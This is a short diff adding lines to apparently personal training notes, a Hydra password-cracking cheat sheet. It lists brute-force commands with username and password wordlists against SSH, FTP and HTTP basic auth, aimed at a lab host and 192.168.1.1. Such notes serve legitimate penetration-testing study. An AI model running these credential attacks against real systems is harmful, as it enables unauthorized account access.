@@ -1,3 +1,19 @@
 file:///root/Hydra-Password-Cracking-Cheatsheet.pdf
 hydra -l admin -P pass.txt http-get://enum.thm/labs/basic_auth/:A=BASIC -vV (This can be used to run hydra and crack passwords as used in burp suite)
 
+used for SSH logins
+hydra -L usernames.txt -P passwords.txt ssh://192.168.1.1
+note: use t 4 to limit the number of tasks to 4 you can use another number if needed to limit the number as well
+
+
+Single password with multiple usernames:
+hydra -L usernames.txt -p password123 ssh://192.168.1.1
+
+Brute force HTTP authentication:
+hydra -L usernames.txt -P passwords.txt http://192.168.1.1
+
+Brute force FTP logins:
+hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1
+
+Single username with multiple passwords:
+hydra -l admin -P passwords.txt ssh://192.168.1.1
